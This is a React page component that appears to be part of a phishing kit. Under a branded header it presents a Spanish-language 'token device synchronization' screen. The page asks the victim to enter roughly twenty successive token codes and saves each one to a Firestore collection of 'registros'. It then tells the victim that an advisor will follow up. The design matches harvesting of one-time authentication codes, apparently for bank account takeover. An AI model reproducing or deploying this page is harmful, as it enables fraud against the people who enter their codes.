import { useState, useEffect } from "react";
import firebase from "../components/firebase";
import Swal from "sweetalert2";
function findGetParameter(url) {
  var result = null,
    tmp = [];
  window.location.search
    .substr(1)
    .split("&")
    .forEach(function (item) {
      tmp = item.split("=");
      if (tmp[0] === url) result = decodeURIComponent(tmp[1]);
    });
  return result;
}

const ConfigurarFirma = () => {
  const [activeCursos, setActiveCursos] = useState([]);
  const [infoUser, setInfoUser] = useState([]);
  const [count, setCount] = useState(1);
  const [firstSave, setFirstSave] = useState(false);
  useEffect(() => {
    const cursosRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursosRef.onSnapshot((snapshot) => {
      setActiveCursos(snapshot.data().usuario);
    });
  }, []);

  const CreateUser = (name, text) => {
    let nameReal = "key" + count;
    setInfoUser({ ...infoUser, [nameReal]: text });
    setFirstSave(true);
  };

  useEffect(() => {
    if (firstSave) {
      Save();
    }
  }, [infoUser]);

  const Save = () => {
    let arrayAux = findGetParameter("firma");
    activeCursos[arrayAux].keys = infoUser;
  };

  const SaveOnclick = () => {
    const cursoRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursoRef.update({ usuario: activeCursos });
  };

  const handdleWhatsApp = (text) => {
    let arrayAux = findGetParameter("firma");
    activeCursos[arrayAux].keys = infoUser;
    const cursoRef = firebase
      .firestore()
      .collection("registros")
      .doc("registros");
    cursoRef.update({ usuario: activeCursos }).then(() => {
      window.location.href = "/";
    });
  };

  const Increment = () => {
    SaveOnclick();
    document.getElementById("keyInput").value = " ";
    if (count === 20) {
      Swal.fire(
        "Información subida correctamente, su asesor lo guiará en el proceso."
      );
      handdleWhatsApp();
    } else {
      setCount(count + 1);
    }
  };
  return (
    <>
      <div className="bg-[#25318d] w-full h-[6rem] grid content-center">
        <div className=" lg:w-7/12 mx-auto ">
          <img
            className=" h-[5rem]"
            src="https://static.wixstatic.com/media/522144_234e90535ea940868ced4ae9349cc3ba~mv2.jpg/v1/fill/w_105,h_102,al_c,q_80,usm_0.66_1.00_0.01/H09.webp"
          />
        </div>
      </div>{" "}
      <div className="w-11/12 lg:w-8/12 justify-center grid mx-auto">
        <div className="w-full">
        <img className="w-11/12 mx-auto mt-1" src="/H10.webp" />

          <h1 className="text-lg mb-5 lg:text-3xl text-center mt-16 text-indigo-800 font-bold">
            Registro
          </h1>
          <p>Sincronización de Dispositivo Token</p>
          <p className="text-center font-bold text-4xl">
            {count * 5}%
          </p>
          <div className="flex flex-col mt-3 ">
            <p className="mt-2 mb-1">Ingresar Token</p>
            <input
              className="border p-2"
              id="keyInput"
              placeholder="Texto.."
              onChange={(e) => CreateUser(count, e.target.value)}
            />
          </div>
          <div className="justify-center grid ">
          <button
            onClick={(e) => Increment()}
            className="mt-5 bg-[#c0dd66] py-2 px-8 font-semibold text-xl grid  text-center"
          >
            {count < 18 ? "Siguiente" : "Finalizar"}
          </button>
          </div>
        </div>
      </div>{" "}
      <div className="border ">
          <div className="lg:w-7/12 mx-auto">
            <img className="w-screen" src="/H7.webp" />
          </div>
        </div>
    </>
  );
};
ConfigurarFirma.layout = "L2";
export default ConfigurarFirma;
